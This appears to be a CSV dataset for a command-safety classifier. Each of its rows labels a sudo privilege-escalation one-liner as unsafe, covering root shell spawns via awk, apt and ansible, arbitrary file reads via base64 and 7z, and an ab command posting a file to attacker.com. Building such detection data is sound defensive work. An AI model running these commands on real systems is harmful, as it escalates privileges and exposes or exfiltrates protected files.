isSafe,command
0,LFILE=file_to_read sudo 7z a -ttar -an -so $LFILE | 7z e -ttar -si -so 
0,sudo aa-exec /bin/sh
0,URL=http://attacker.com/ LFILE=file_to_send sudo ab -p $LFILE $URL 
0,"LFILE=file_to_read sudo alpine -F ""$LFILE"" "
0,"TF=$(mktemp) echo '[{hosts: localhost, tasks: [shell: /bin/sh </dev/tty >/dev/tty 2>/dev/tty]}]' >$TF sudo ansible-playbook $TF "
0,sudo ansible-test shell
0,sudo aoss /bin/sh
0,"LFILE=file_to_read sudo apache2ctl -c ""Include $LFILE"" -k stop "
0,sudo apt-get changelog apt !/bin/sh 
0,sudo apt changelog apt !/bin/sh 
0,"TF=$(mktemp -u) LFILE=file_to_read sudo ar r ""$TF"" ""$LFILE"" cat ""$TF"" "
0,"COMMAND='id' TF=$(mktemp) echo ""$COMMAND"" > $TF chmod +x $TF sudo aria2c --on-download-error=$TF http://x "
0,"TF=$(mktemp -d) LFILE=file_to_write LDIR=where_to_write echo DATA >""$TF/$LFILE"" arj a ""$TF/a"" ""$TF/$LFILE"" sudo arj e ""$TF/a"" $LDIR "
0,"LFILE=file_to_read sudo arp -v -f ""$LFILE"" "
0,LFILE=file_to_read sudo as @$LFILE 
0,"LFILE=file_to_read sudo ascii-xfr -ns ""$LFILE"" "
0,"LFILE=file_to_read sudo ascii85 ""$LFILE"" | ascii85 --decode "
0,sudo ash
0,"LFILE=file_to_read sudo aspell -c ""$LFILE"" "
0,"echo ""/bin/sh <$(tty) >$(tty) 2>$(tty)"" | sudo at now; tail -f /dev/null "
0,"LFILE=file_to_read sudo atobm $LFILE 2>&1 | awk -F ""'"" '{printf ""%s"", $2}' "
0,"sudo awk 'BEGIN {system(""/bin/sh"")}'"
0,sudo aws help !/bin/sh 
0,"LFILE=file_to_read sudo base32 ""$LFILE"" | base32 --decode "
0,"LFILE=file_to_read sudo base58 ""$LFILE"" | base58 --decode "
0,"LFILE=file_to_read sudo base64 ""$LFILE"" | base64 --decode "
0,LFILE=file_to_read sudo basenc --base64 $LFILE | basenc -d --base64 
0,"LFILE=file_to_read sudo basez ""$LFILE"" | basez --decode "
0,sudo bash
